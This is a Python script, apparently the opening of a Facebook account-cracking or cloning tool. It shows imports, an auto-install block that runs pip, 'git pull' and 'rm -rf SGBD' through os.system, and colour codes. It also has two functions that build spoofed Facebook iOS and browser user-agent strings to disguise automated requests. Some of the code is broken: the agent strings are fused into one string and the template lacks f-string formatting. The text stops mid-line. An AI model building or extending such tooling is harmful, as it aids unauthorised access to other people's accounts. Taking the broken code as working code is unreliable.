import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('git pull')
    os.system('rm -rf SGBD')
    os.system('pip install bs4')
    os.system('pip install httpx')
    
#---------MISSING-MODIUL---------#
A = '\x1b[38;5;51m' 
I="\x1b[38;5;48m"
II="\x1b[38;5;49m"
XXR="\033[38;5;118m"
TT="\033[38;5;119m"
FR="\033[38;5;120m"
FX="\033[38;5;121m"
TE="\033[38;5;122m"
FG="\033[38;5;123m"
RED = "\033[1;91m"
WHITE = "\033[1;97m"
GREEN = "\033[1;32m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
#G="\033[1;32m"
GX="\x1b[38;5;47m"
GP="\x1b[38;5;48m"
GN="\x1b[38;5;49m"
GS="\x1b[38;5;50m"
EXTRA ="\x1b[38;5;208m"
PY="\033[38;5;49m"
bFLASH="\033[1;30m" 
M="\033[1;31m"       
RX="\033[38;5;195m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
#G="\033[1;32m"              
#R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
FF="\033[38;5;118m"
GGG="\x1b[38;5;214m"
W = "\033[97;1m"
S = "\033[96;1m" 	
#-------COLOR-CODE------#
G="\x1b[38;5;47m"
RGN="\x1b[38;5;78m"
BG="\033[1;95m"
SX="\033[38;5;195m"
RR="\x1b[38;5;198m"
L="\x1b[38;5;51m"
W="\033[1;30m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"
R="\x1b[38;5;198m"
RED = '\033[1;91m'
GREEN = '\033[1;32m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
uat = []
twf=[]
bou=[]
ids=[]
def clear():
    os.system("clear")
    print(logo)
#==============================#
def back():
    main()
#====================U======================
def iAmMethod3Ua():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
    ua = random.choice(["Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36"+"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36 EdgA/118.0.2088.58"+"Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"+"Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0"+"Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:119.0) Gecko/119.0 Firefox/119.0"+"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36 OPR/76.2.4027.73374"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Linux i686; rv:115.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (iPad; CPU OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.41 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/118.2088.68 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.3"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.1"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.3"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.3"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.6"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0."+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0."+"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60"+"Mozilla/5.0 (X11; CrOS aarch64 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.102 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.936 YaBrowser/23.9.3.936 Yowser/2.5 Safari/537.36"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0"+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.57"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.0 Safari/537.36"+"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 SeaMonkey/2.53.10.2"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0"+"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 GLS/90.10.1589.90"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.933 YaBrowser/23.9.3.933 Yowser/2.5 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",])+END
    return ua
#NEW IDS METHOD 2
def iAmMethod4Ua():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
    ua = random.choice(["Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36"+"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36 EdgA/118.0.2088.58"+"Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"+"Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0"+"Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:119.0) Gecko/119.0 Firefox/119.0"+"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36 OPR/76.2.4027.73374"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (X11; Linux i686; rv:115.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0"+"Mozilla/5.0 (iPad; CPU OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.41 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/118.2088.68 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15"+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.3"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.1"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.3"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39"+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.3"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0."+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46"+"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.6"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0."+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0."+"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 OPR/103.0.0.0"+"Mozilla/5.0 